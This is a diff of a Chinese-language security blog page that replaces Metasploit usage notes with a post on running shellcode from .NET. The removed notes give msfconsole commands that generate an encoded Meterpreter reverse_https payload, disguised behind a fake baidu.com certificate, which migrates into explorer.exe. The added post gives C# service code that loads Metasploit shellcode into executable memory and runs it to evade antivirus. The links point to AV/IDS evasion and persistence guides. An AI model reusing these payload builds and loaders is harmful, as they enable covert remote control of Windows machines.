@@ -8,7 +8,7 @@
   
   <meta name="author" content="c4bbage">
   
-  <title>metasplit使用笔记 - c4bbage blog</title>
+  <title>.net 执行 shellcode - c4bbage blog</title>
   
 
   <link rel="shortcut icon" href="../img/favicon.ico">
@@ -23,9 +23,9 @@
   
   <script>
     // Current page data
-    var mkdocs_page_name = "metasplit使用笔记";
-    var mkdocs_page_input_path = "msf_usage.md";
-    var mkdocs_page_url = "/msf_usage/";
+    var mkdocs_page_name = ".net 执行 shellcode";
+    var mkdocs_page_input_path = ".netcallshellcode.md";
+    var mkdocs_page_url = "/.netcallshellcode/";
   </script>
   
   <script src="../js/jquery-2.1.1.min.js"></script>
@@ -133,19 +133,8 @@
 
         
             
-    <li class="toctree-l1 current">
-        <a class="current" href="./">metasplit使用笔记</a>
-        
-            <ul>
-            
-                <li class="toctree-l3"><a href="#metasploit">metasploit使用笔记</a></li>
-                
-                    <li><a class="toctree-l4" href="#_1">开启</a></li>
-                
-                    <li><a class="toctree-l4" href="#_2">引用</a></li>
-                
-            
-            </ul>
+    <li class="toctree-l1 ">
+        <a class="" href="../msf_usage/">metasplit使用笔记</a>
         
     </li>
 
@@ -166,8 +155,19 @@
 
         
             
-    <li class="toctree-l1 ">
-        <a class="" href="../.netcallshellcode/">.net 执行 shellcode</a>
+    <li class="toctree-l1 current">
+        <a class="current" href="./">.net 执行 shellcode</a>
+        
+            <ul>
+            
+                <li class="toctree-l3"><a href="#net-shellcode">.net 执行shellcode</a></li>
+                
+                    <li><a class="toctree-l4" href="#_1">如下</a></li>
+                
+                    <li><a class="toctree-l4" href="#_2">引用</a></li>
+                
+            
+            </ul>
         
     </li>
 
@@ -204,11 +204,11 @@
     
       
         
-          <li>实用工具 &raquo;</li>
+          <li>技巧笔记 &raquo;</li>
         
       
     
-    <li>metasplit使用笔记</li>
+    <li>.net 执行 shellcode</li>
     <li class="wy-breadcrumbs-aside">
       
     </li>
@@ -218,39 +218,122 @@
           <div role="main">
             <div class="section">
               
-                <h1 id="metasploit">metasploit使用笔记</h1>
+                <h1 id="net-shellcode">.net 执行shellcode</h1>
 <hr />
-<h2 id="_1">开启</h2>
-<pre><code class="shell">db_connect ./database.yml
-use payload/windows/meterpreter/reverse_https
-set overridelhost www.baidu.com
-set OverrideRequestHost true
-set OverrideLPORT 443
-openssl req -new -newkey rsa:4096 -days 365 -nodes -x509 \
-    -subj &quot;/C=US/ST=Texas/L=Austin/O=Development/CN=www.baidu.com&quot; \
-    -keyout www.baidu.com.key \
-    -out www.baidu.com.crt &amp;&amp; \
-cat www.baidu.com.key  www.baidu.com.crt &gt; www.baidu.com.pem &amp;&amp; \
-rm -f www.baidu.com.key  www.baidu.com.crt
-set handlersslcert ./www.baidu.com.pem
-set StagerVerifySSLCert=true
-set EnableStageEncoding true
-generate -E -b '\x00\xff' -f /tmp/baidu.com.exe -t exe -a x86 --platform win -e x86/shikata_ga_nai -i 2
-set autorunscript post/windows/manage/migrate NAME=explorer.exe
+<h2 id="_1">如下</h2>
+<pre><code>
+// from https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/
+using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Diagnostics;
+using System.Linq;
+using System.ServiceProcess;
+using System.Text;
+using System.Runtime.InteropServices;
+
+namespace metservice
+{
+    public partial class Service1 : ServiceBase
+    {
+        public Service1()
+        {
+            InitializeComponent();
+        }
+
+        protected override void OnStart(string[] args)
+        {
+            // native function's compiled code
+            // generated with metasploit
+            byte[] shellcode = new byte[] {
+0xbf,0xe2,0xe6,0x44,.... (stage 1 shellcode)
+                };
+
+            UInt32 funcAddr = VirtualAlloc(0, (UInt32)shellcode .Length,
+                                MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+            Marshal.Copy(shellcode , 0, (IntPtr)(funcAddr), shellcode .Length);
+            IntPtr hThread = IntPtr.Zero;
+            UInt32 threadId = 0;
+            // prepare data
+
+
+            IntPtr pinfo = IntPtr.Zero;
+
+            // execute native code
+
+            hThread = CreateThread(0, 0, funcAddr, pinfo, 0, ref threadId);
+            WaitForSingleObject(hThread, 0xFFFFFFFF);
+
+      }
+
+        private static UInt32 MEM_COMMIT = 0x1000;
+
+        private static UInt32 PAGE_EXECUTE_READWRITE = 0x40;
+
+
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 VirtualAlloc(UInt32 lpStartAddr,
+             UInt32 size, UInt32 flAllocationType, UInt32 flProtect);
+
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern bool VirtualFree(IntPtr lpAddress,
+                              UInt32 dwSize, UInt32 dwFreeType);
+
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern IntPtr CreateThread(
+
+          UInt32 lpThreadAttributes,
+          UInt32 dwStackSize,
+          UInt32 lpStartAddress,
+          IntPtr param,
+          UInt32 dwCreationFlags,
+          ref UInt32 lpThreadId
+
+          );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern bool CloseHandle(IntPtr handle);
+
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 WaitForSingleObject(
+
+          IntPtr hHandle,
+          UInt32 dwMilliseconds
+          );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern IntPtr GetModuleHandle(
+
+          string moduleName
+
+          );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 GetProcAddress(
+
+          IntPtr hModule,
+          string procName
+
+          );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 LoadLibrary(
+
+          string lpFileName
+
+          );
+        [DllImport(&quot;kernel32&quot;)]
+        private static extern UInt32 GetLastError();
+
+
+        protected override void OnStop()
+        {
+        }
+    }
+}
 </code></pre>
 
-<blockquote>
-<p>windows server 2003 sp2 测试不能连接成功,win2008 win7 win10均无问题</p>
-</blockquote>
 <h2 id="_2">引用</h2>
 <ul>
-<li><a href="https://github.com/rapid7/metasploit-framework/wiki/Meterpreter-Paranoid-Mode">Meterpreter Paranoid Mode</a></li>
-<li><a href="https://blog.cobaltstrike.com/2013/06/28/staged-payloads-what-pen-testers-should-know/">Staged Payloads – What Pen Testers Should Know</a></li>
-<li><a href="https://community.rapid7.com/community/metasploit/blog/2013/02/01/stage-encoding-or-how-i-learned-to-stop-worrying-and-love-the-string-operator">阶段编码</a></li>
-<li><a href="https://arno0x0x.wordpress.com/2016/04/13/meterpreter-av-ids-evasion-powershell/">Meterpreter stage AV/IDS evasion with powershell</a></li>
-<li><a href="http://security.stackexchange.com/questions/131789/metasploit-meterpreter-persistence-script-alternatives">Metasploit Meterpreter Persistence Script Alternatives</a></li>
-<li><a href="https://github.com/rsmudge/metasploit-loader">metasploit loader</a></li>
-<li><a href="https://arno0x0x.wordpress.com/2016/04/13/meterpreter-av-ids-evasion-powershell/">Meterpreter stage AV/IDS evasion with powershell</a></li>
+<li><a href="https://www.mattandreko.com/2012/02/23/using-net-to-bypass-av/">Using .net to Bypass AV</a></li>
+<li><a href="https://webstersprodigy.net/2012/08/31/av-evading-meterpreter-shell-from-a-net-service/">AV Evading Meterpreter Shell from a .NET Service</a></li>
 </ul>
               
             </div>
@@ -259,10 +342,10 @@ set autorunscript post/windows/manage/migrate NAME=explorer.exe
   
     <div class="rst-footer-buttons" role="navigation" aria-label="footer navigation">
       
-        <a href="../cobaltstrike_usage/" class="btn btn-neutral float-right" title="cobalt strike 杂记">Next <span class="icon icon-circle-arrow-right"></span></a>
+        <a href="../about/" class="btn btn-neutral float-right" title="About">Next <span class="icon icon-circle-arrow-right"></span></a>
       
       
-        <a href="../debian8_install_msf/" class="btn btn-neutral" title="debian8安装metasploit"><span class="icon icon-circle-arrow-left"></span> Previous</a>
+        <a href="../cobaltstrike_usage/" class="btn btn-neutral" title="cobalt strike 杂记"><span class="icon icon-circle-arrow-left"></span> Previous</a>
       
     </div>
   
@@ -288,10 +371,10 @@ set autorunscript post/windows/manage/migrate NAME=explorer.exe
     <span class="rst-current-version" data-toggle="rst-current-version">
       
       
-        <span><a href="../debian8_install_msf/" style="color: #fcfcfc;">&laquo; Previous</a></span>
+        <span><a href="../cobaltstrike_usage/" style="color: #fcfcfc;">&laquo; Previous</a></span>
       
       
-        <span style="margin-left: 15px"><a href="../cobaltstrike_usage/" style="color: #fcfcfc">Next &raquo;</a></span>
+        <span style="margin-left: 15px"><a href="../about/" style="color: #fcfcfc">Next &raquo;</a></span>
       
     </span>
 </div>
